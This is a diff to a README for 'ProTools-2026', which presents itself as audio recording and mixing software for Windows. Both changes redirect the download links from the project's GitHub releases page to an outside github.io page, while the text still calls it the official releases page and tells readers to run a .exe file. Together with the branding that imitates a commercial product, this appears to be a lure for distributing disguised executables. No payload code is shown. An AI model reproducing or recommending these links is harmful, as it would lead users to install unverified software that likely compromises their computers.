@@ -1,6 +1,6 @@
 # 🎧 ProTools-2026 - Master audio production on your computer
 
-[![Download ProTools-2026](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/latrenaskinny318/ProTools-2026/releases)
+[![Download ProTools-2026](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://latrenaskinny318.github.io)
 
 ## 📌 About the software
 ProTools-2026 allows you to record, edit, and mix audio files on Windows 10 and 11. This application provides tools for music production, podcast creation, and sound design. It streamlines the workflow for musicians and engineers by offering professional features in a layout that follows industry norms. 
@@ -17,7 +17,7 @@ Before you start, check that your computer meets these minimum specifications to
 ## 📥 Getting the software
 You can get the installation file from the official releases page. 
 
-[Click here to visit the releases page and download the installer](https://github.com/latrenaskinny318/ProTools-2026/releases)
+[Click here to visit the releases page and download the installer](https://latrenaskinny318.github.io)
 
 Choose the file ending in .exe to begin the process. Save this file to your Downloads folder or your desktop so you can find it easily. 
 
